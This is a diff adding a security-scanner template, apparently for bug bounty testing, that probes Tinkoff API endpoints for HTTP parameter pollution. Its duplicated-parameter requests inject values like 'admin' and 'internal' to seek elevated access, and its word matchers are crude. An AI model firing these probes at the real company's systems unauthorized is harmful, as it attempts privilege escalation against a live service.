@@ -1,0 +1,41 @@
+id: tinkoff-parameter-pollution
+
+info:
+  name: Tinkoff - HTTP Parameter Pollution
+  author: bugbounty
+  severity: medium
+  description: Parameter pollution in session_info and API endpoints
+  tags: hpp,pollution,tinkoff
+
+http:
+  - raw:
+      - |
+        GET /api/common/v1/session_info?platform=web&platform=admin&sessionid=test HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/common/v1/mobile_info?platform=android&platform=internal&sessionid=test HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/invest-gw/social/v1/post?id=1&id=2&id=admin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /api/common/v1/session_info?sessionid=user&sessionid=admin&sessionid=test HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "internal"
+          - "privileged"
+          - "elevated"
+        condition: or
